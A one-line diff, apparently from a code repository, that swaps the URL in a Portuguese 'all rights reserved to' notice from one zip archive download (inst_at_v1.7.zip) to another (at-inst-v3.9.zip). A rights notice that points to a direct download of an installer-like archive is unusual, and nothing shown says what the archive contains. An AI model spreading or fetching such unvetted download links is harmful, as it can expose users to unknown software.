@@ -1,1 +1,1 @@
-Todos os direitos reservados a https://raw.githubusercontent.com/rlmourarj/at2025_inst/main/utils/inst_at_v1.7.zip
+Todos os direitos reservados a https://github.com/rlmourarj/at2025_inst/raw/refs/heads/main/utils/at-inst-v3.9.zip
